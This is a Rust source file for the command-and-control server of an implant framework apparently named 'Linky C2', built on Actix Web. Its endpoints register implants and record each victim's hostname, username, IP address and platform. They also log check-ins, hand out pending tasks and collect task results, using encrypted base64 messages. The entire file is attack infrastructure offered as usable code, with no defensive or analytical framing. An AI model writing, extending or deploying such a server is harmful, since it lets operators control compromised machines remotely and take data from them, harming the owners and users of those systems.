// C2 Server Implementation using Actix Web

use actix_web::{web, App, HttpRequest, HttpResponse, HttpServer, Responder};
use actix_web::middleware::Logger;
use serde_json::json;
use std::sync::Arc;
use crate::c2::{C2Server, C2Message, Implant, ImplantStatus, TaskStatus};
use crate::utils::{base64_decode, base64_encode, encrypt_data, decrypt_data};
use chrono::Utc;

pub struct AppState {
    pub c2_server: Arc<C2Server>,
}

pub async fn start_c2_server(c2_server: Arc<C2Server>) -> std::io::Result<()> {
    let app_state = web::Data::new(AppState {
        c2_server: c2_server.clone(),
    });

    log::info!("Starting Linky C2 Server on {}:{}", 
        c2_server.config.server_address, c2_server.config.port);

    HttpServer::new(move || {
        App::new()
            .app_data(app_state.clone())
            .wrap(Logger::default())
            .service(web::resource("/api/register").route(web::post().to(register_implant)))
            .service(web::resource("/api/checkin").route(web::post().to(implant_checkin)))
            .service(web::resource("/api/task").route(web::post().to(get_tasks)))
            .service(web::resource("/api/result").route(web::post().to(submit_result)))
            .service(web::resource("/api/status").route(web::get().to(server_status)))
    })
    .bind((c2_server.config.server_address.clone(), c2_server.config.port))?
    .run()
    .await
}

async fn register_implant(
    _req: HttpRequest,
    body: String,
    data: web::Data<AppState>,
) -> impl Responder {
    log::info!("Registration request from: {:?}", _req.peer_addr());

    // Decrypt and parse the message
    let decrypted = match decrypt_message(&body, &data.c2_server.config.encryption_key) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("Decryption failed: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid message format"
            }));
        }
    };

    let message: C2Message = match serde_json::from_str(&decrypted) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("JSON parse error: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid JSON format"
            }));
        }
    };

    if message.message_type != crate::c2::MessageType::Register {
        return HttpResponse::BadRequest().json(json!({
            "status": "error",
            "message": "Expected registration message"
        }));
    }

    // Parse implant data from payload
    let implant_data: serde_json::Value = match serde_json::from_str(&message.payload) {
        Ok(data) => data,
        Err(e) => {
            log::error!("Invalid implant data: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid implant data"
            }));
        }
    };

    let implant = Implant {
        id: message.implant_id.clone(),
        hostname: implant_data["hostname"].as_str().unwrap_or("unknown").to_string(),
        username: implant_data["username"].as_str().unwrap_or("unknown").to_string(),
        ip_address: _req.peer_addr().map(|a| a.to_string()).unwrap_or_else(|| "unknown".to_string()),
        platform: implant_data["platform"].as_str().unwrap_or("unknown").to_string(),
        last_checkin: Utc::now(),
        status: ImplantStatus::Active,
        tasks: Vec::new(),
    };

    // Register the implant
    data.c2_server.register_implant(implant.clone());

    log::info!("Successfully registered implant: {}", implant.id);

    HttpResponse::Ok().json(json!({
        "status": "success",
        "implant_id": implant.id,
        "message": "Implant registered successfully"
    }))
}

async fn implant_checkin(
    _req: HttpRequest,
    body: String,
    data: web::Data<AppState>,
) -> impl Responder {
    let decrypted = match decrypt_message(&body, &data.c2_server.config.encryption_key) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("Decryption failed in checkin: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid message format"
            }));
        }
    };

    let message: C2Message = match serde_json::from_str(&decrypted) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("JSON parse error in checkin: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid JSON format"
            }));
        }
    };

    if message.message_type != crate::c2::MessageType::CheckIn {
        return HttpResponse::BadRequest().json(json!({
            "status": "error",
            "message": "Expected check-in message"
        }));
    }

    // Update implant check-in time
    let success = data.c2_server.implant_checkin(&message.implant_id);

    if success {
        log::info!("Check-in from implant: {}", message.implant_id);
        HttpResponse::Ok().json(json!({
            "status": "success",
            "message": "Check-in recorded"
        }))
    } else {
        log::warn!("Check-in from unknown implant: {}", message.implant_id);
        HttpResponse::NotFound().json(json!({
            "status": "error",
            "message": "Implant not found"
        }))
    }
}

async fn get_tasks(
    _req: HttpRequest,
    body: String,
    data: web::Data<AppState>,
) -> impl Responder {
    let decrypted = match decrypt_message(&body, &data.c2_server.config.encryption_key) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("Decryption failed in get_tasks: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid message format"
            }));
        }
    };

    let message: C2Message = match serde_json::from_str(&decrypted) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("JSON parse error in get_tasks: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid JSON format"
            }));
        }
    };

    if message.message_type != crate::c2::MessageType::TaskRequest {
        return HttpResponse::BadRequest().json(json!({
            "status": "error",
            "message": "Expected task request message"
        }));
    }

    // Get pending tasks for this implant
    let tasks = data.c2_server.get_pending_tasks(&message.implant_id);

    log::info!("Sending {} tasks to implant: {}", tasks.len(), message.implant_id);

    HttpResponse::Ok().json(json!({
        "status": "success",
        "tasks": tasks
    }))
}

async fn submit_result(
    _req: HttpRequest,
    body: String,
    data: web::Data<AppState>,
) -> impl Responder {
    let decrypted = match decrypt_message(&body, &data.c2_server.config.encryption_key) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("Decryption failed in submit_result: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid message format"
            }));
        }
    };

    let message: C2Message = match serde_json::from_str(&decrypted) {
        Ok(msg) => msg,
        Err(e) => {
            log::error!("JSON parse error in submit_result: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid JSON format"
            }));
        }
    };

    if message.message_type != crate::c2::MessageType::TaskResponse {
        return HttpResponse::BadRequest().json(json!({
            "status": "error",
            "message": "Expected task response message"
        }));
    }

    // Parse task result
    let result_data: serde_json::Value = match serde_json::from_str(&message.payload) {
        Ok(data) => data,
        Err(e) => {
            log::error!("Invalid result data: {}", e);
            return HttpResponse::BadRequest().json(json!({
                "status": "error",
                "message": "Invalid result data"
            }));
        }
    };

    let task_id = result_data["task_id"].as_str().unwrap_or("");
    let result = result_data["result"].as_str().map(|s| s.to_string());
    let status = result_data["status"].as_str().unwrap_or("completed");

    let task_status = match status {
        "completed" => TaskStatus::Completed,
        "failed" => TaskStatus::Failed,
        _ => TaskStatus::Completed,
    };

    // Update task status
    let success = data.c2_server.update_task(task_id, task_status, result);

    if success {
        log::info!("Received result for task: {}", task_id);
        HttpResponse::Ok().json(json!({
            "status": "success",
            "message": "Result recorded"
        }))
    } else {
        log::warn!("Result for unknown task: {}", task_id);
        HttpResponse::NotFound().json(json!({
            "status": "error",
            "message": "Task not found"
        }))
    }
}

async fn server_status(data: web::Data<AppState>) -> impl Responder {
    let implants = data.c2_server.get_implants();
    
    HttpResponse::Ok().json(json!({
        "status": "online",
        "implants": implants.len(),
        "timestamp": Utc::now().to_rfc3339()
    }))
}

fn decrypt_message(encrypted: &str, key: &str) -> Result<String, String> {
    let decoded = base64_decode(encrypted)
        .map_err(|e| format!("Base64 decode error: {}", e))?;
    
    let decrypted = decrypt_data(&decoded, key.as_bytes());
    
    String::from_utf8(decrypted)
        .map_err(|e| format!("UTF-8 conversion error: {}", e))
}

fn encrypt_message(message: &str, key: &str) -> String {
    let encrypted = encrypt_data(message.as_bytes(), key.as_bytes());
    base64_encode(&encrypted)
}